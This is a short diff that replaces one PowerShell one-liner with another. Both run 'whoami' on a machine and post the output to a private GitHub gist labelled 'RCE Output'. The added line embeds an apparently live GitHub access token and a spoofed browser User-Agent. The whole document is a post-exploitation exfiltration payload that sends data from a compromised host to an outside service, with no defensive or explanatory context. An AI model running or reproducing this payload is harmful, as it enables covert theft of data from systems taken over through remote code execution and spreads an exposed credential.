@@ -1,3 +1,1 @@
-powershell -Command "whoami | ForEach-Object { Invoke-RestMethod -Uri 'https://api.github.com/gists' -Headers @{Authorization = 'token YOUR_GITHUB_PERSONAL_ACCESS_TOKEN'} -Method POST -Body ('{""description"":""RCE Output"",""public"":false,""files"":{""output.txt"":{""content"":""' + $_.trim() + '""}}}') }"
-
-
+$output=whoami; $body=@{description="RCE Outputamine"; public=$false; files=@{"outputamine.txt"=@{content=$output}}} | ConvertTo-Json -Depth 3; Invoke-WebRequest -Uri "https://api.github.com/gists" -Headers @{Authorization="token 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"; "User-Agent"="Mozilla/5.0"} -Method POST -Body $body
